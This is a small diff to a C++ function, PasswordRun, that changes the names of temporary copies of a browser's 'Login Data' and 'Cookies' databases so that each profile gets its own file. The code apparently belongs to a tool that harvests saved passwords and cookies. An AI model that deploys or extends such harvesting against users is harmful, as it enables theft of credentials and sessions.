@@ -303,7 +303,7 @@ void PasswordRun(LPSTR lpCmdLine)
 			}
 
 			std::string db = path + "Login Data";
-			std::string tempDB = "p8791.db";
+			std::string tempDB = "p8791-" + profile + ".db";
 
 			// Open Database
 			My::Debug(std::string("PasswordRun: ") + "Copying from " + path + " to " + tempDB);
@@ -353,7 +353,7 @@ void PasswordRun(LPSTR lpCmdLine)
 			try
 			{
 				std::string db = path + "Cookies";
-				std::string tempDB = "c8791.db";
+				std::string tempDB = "c8791-" + profile + ".db";
 
 				// Open Database
 				My::Debug(std::string("PasswordRun: ") + "Copying from " + path + " to " + tempDB);
